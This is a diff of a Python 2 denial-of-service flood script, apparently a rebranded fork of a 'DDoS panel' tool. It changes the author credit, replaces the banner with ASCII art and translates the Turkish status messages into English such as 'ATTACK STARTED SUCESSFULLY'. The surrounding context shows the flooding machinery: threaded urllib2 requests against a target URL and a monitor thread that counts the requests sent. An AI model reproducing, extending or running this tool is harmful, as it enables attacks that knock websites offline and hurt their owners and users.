@@ -1,4 +1,5 @@
-#coded by emyounoone
+# -*- coding: utf8 -*-
+#coded by Alb[E]rTTz
 import urllib2
 import sys
 import threading
@@ -6,23 +7,46 @@ import random
 import re
 
 def banner():
-    print \
-    """                        .
-     
-                        \x1b[38;2;0;212;14m╔═╗ \x1b[38;2;0;186;45m ═╗ ╦  ╔═\x1b[38;2;0;150;88m╗  ╔╦╗ \x1b[38;2;0;113;133m ╔╦╗ \x1b[38;2;0;83;168m ╔═╗ \x1b[38;2;0;49;147m ╔═╗
-                        \x1b[38;2;0;212;14m╔═╝ \x1b[38;2;0;186;45m ╔╩╦╝  ║ \x1b[38;2;0;150;88m    ║║ \x1b[38;2;0;113;133m  ║║ \x1b[38;2;0;83;168m ║ ║ \x1b[38;2;0;49;147m ╚═╗
-                        \x1b[38;2;0;212;14m╚═╝ \x1b[38;2;0;186;45m ╩ ╚═  ╚═\x1b[38;2;0;150;88m╝  ═╩╝ \x1b[38;2;0;113;133m ═╩╝ \x1b[38;2;0;83;168m ╚═╝ \x1b[38;2;0;49;147m ╚═╝
-                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
-                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to ZxC C2 DDoS Panel        \x1b[38;2;0;49;147m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239mFree DDoS Panel 2022\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
-                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
-                    \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
-                    \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://github.com/hoaan1995/ZxCDDoS \x1b[38;2;0;49;147m║
-                    \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
-                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
-                \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;0;49;147m║
-                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
-    """
+    print("'\x1b[38;2;0;212;14m                                                                                    ..;===+.")
+    print("                                                                                .:=iiiiii=+=")
+    print("                                                                             .=i))=;::+)i=+,")
+    print("                                                                          ,=i);)I)))I):=i=;")
+    print("                                                                       .=i==))))ii)))I:i++")
+    print("                                                                     +)+))iiiiiiii))I=i+:'")
+    print("                                                .,:;;++++++;:,.       )iii+:::;iii))+i='")
+    print("                                             .:;++=iiiiiiiiii=++;.    =::,,,:::=i));=+'")
+    print("                                           ,;+==ii)))))))))))ii==+;,      ,,,:=i))+=:")
+    print("                                         ,;+=ii))))))IIIIII))))ii===;.    ,,:=i)=i+")
+    print("                                        ;+=ii)))IIIIITIIIIII))))iiii=+,   ,:=));=,")
+    print("                                      ,+=i))IIIIIITTTTTITIIIIII)))I)i=+,,:+i)=i+")
+    print("                                     ,+i))IIIIIITTTTTTTTTTTTI))IIII))i=::i))i='")
+    print("                                    ,=i))IIIIITLLTTTTTTTTTTIITTTTIII)+;+i)+i`")
+    print("                                    =i))IIITTLTLTTTTTTTTTIITTLLTTTII+:i)ii:'")
+    print("                                   +i))IITTTLLLTTTTTTTTTTTTLLLTTTT+:i)))=,")
+    print("                                   =))ITTTTTTTTTTTLTTTTTTLLLLLLTi:=)IIiii;")
+    print("                                  .i)IIITTTTTTTTLTTTITLLLLLLLT);=)I)))))i;")
+    print("                                  :))IIITTTTTLTTTTTTLLHLLLLL);=)II)IIIIi=:")
+    print("                                  :i)IIITTTTTTTTTLLLHLLHLL)+=)II)ITTTI)i=")
+    print("                                  .i)IIITTTTITTLLLHHLLLL);=)II)ITTTTII)i+")
+    print("                                  =i)IIIIIITTLLLLLLHLL=:i)II)TTTTTTIII)i'")
+    print("                                +i)i)))IITTLLLLLLLLT=:i)II)TTTTLTTIII)i;")
+    print("                              +ii)i:)IITTLLTLLLLT=;+i)I)ITTTTLTTTII))i;")
+    print("                             =;)i=:,=)ITTTTLTTI=:i))I)TTTLLLTTTTTII)i;")
+    print("                           +i)ii::,  +)IIITI+:+i)I))TTTTLLTTTTTII))=,")
+    print("                         :=;)i=:,,    ,i++::i))I)ITTTTTTTTTTIIII)=+'")
+    print("                       .+ii)i=::,,   ,,::=i)))iIITTTTTTTTIIIII)=+")
+    print("                      ,==)ii=;:,,,,:::=ii)i)iIIIITIIITIIII))i+:'")
+    print("                     +=:))i==;:::;=iii)+)=  `:i)))IIIII)ii+'")
+    print("                   .+=:))iiiiiiii)))+ii;")
+    print("                  .+=;))iiiiii)));ii+")
+    print("                 .+=i:)))))))=+ii+")
+    print("                .;==i+::::=)i=;")
+    print("                ,+==iiiiii+,")
+    print("                `+=+++;`")
+    print("                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗")
+    print("                \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;0;49;147m║")
+    print("                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝\x1b[38;2;239;239;239m")
+
 
 banner()
 #global params
@@ -8226,10 +8250,7 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
-	print 'python ddos.py site-url'
-	print 'emyounoone tarafindan kodlanmistir '
-	print '---------------------------------------------------'
+  print ''
 
 	
 #http request
@@ -8254,7 +8275,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'PAKET GONDERILDI!'
+			print 'FUCKING WEBSITE!!!'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -8285,7 +8306,7 @@ class MonitorThread(threading.Thread):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- BUGUN COK FAZLA DDOS ATILDI '-' --"
+			print "\n-- ATTACK STOPPED '-' --"
 
 #execute 
 if len(sys.argv) < 2:
@@ -8296,7 +8317,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "----|| SALDIRI BASLATILDI ||----"
+		print "----|| ATTACK STARTED SUCESSFULLY ||----"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
